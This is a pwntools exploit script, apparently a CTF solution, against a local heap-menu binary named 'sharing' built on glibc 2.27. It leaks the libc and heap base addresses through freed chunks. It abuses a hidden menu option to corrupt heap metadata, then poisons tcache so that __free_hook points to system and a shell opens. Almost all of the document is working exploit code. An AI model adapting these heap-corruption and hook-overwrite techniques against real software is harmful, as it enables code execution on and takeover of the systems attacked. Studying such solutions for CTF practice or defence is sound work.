from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('sharing')
libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so')
# libc = ELF('libc-2.27.so')
elf = ELF('sharing')


def add(index, size):
    io.sendlineafter('Choice: ', '1')
    io.sendlineafter('Idx: ', str(index))
    io.sendlineafter('Sz: ', str(size))


def move(From, To):
    io.sendlineafter('Choice: ', '2')
    io.sendlineafter('From: ', str(From))
    io.sendlineafter('To: ', str(To))


def show(index):
    io.sendlineafter('Choice: ', '3')
    io.sendlineafter('Idx: ', str(index))


def edit(index, content):
    io.sendlineafter('Choice: ', '4')
    io.sendlineafter('Idx: ', str(index))
    io.sendafter('Content: ', content)


def backdoor(addr):
    io.sendlineafter('Choice: ', '57005')
    io.sendlineafter('Hint: ', p32(0x2F767991 - 3) + p32(1) * 3)
    io.sendlineafter('Addr: ', str(addr))


def pwn():
    add(0, 0x500)
    add(1, 0x500)
    move(1, 0)
    add(2, 0x500)
    show(2)
    libc_base = u64(io.recvn(8)) - libc.sym['__malloc_hook'] - 0x70
    log.success('libc_base: ' + hex(libc_base))
    
    add(3, 0x100)
    add(4, 0x100)
    add(5, 0x100)
    add(6, 0x100)
    move(4, 3)
    move(6, 5)
    add(7, 0x100)
    show(7)
    heap_base = u64(io.recvn(8)) - 0x14050
    log.success('heap_base: ' + hex(heap_base))

    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    target = heap_base + 0x142b8
    for _ in range(0x80 // 2):
        backdoor(target)
    backdoor(target + 1)
    edit(7, 'a' * 16)
    move(4, 7)
    add(8, 0x100)
    edit(8, p64(__free_hook - 8))
    add(9, 0x100)
    add(10, 0x100)
    edit(10, b'/bin/sh\x00' + p64(system))
    move(9, 10)
    # gdb.attach(io)
    io.interactive()
    # pause()


if __name__ == '__main__':
    pwn()
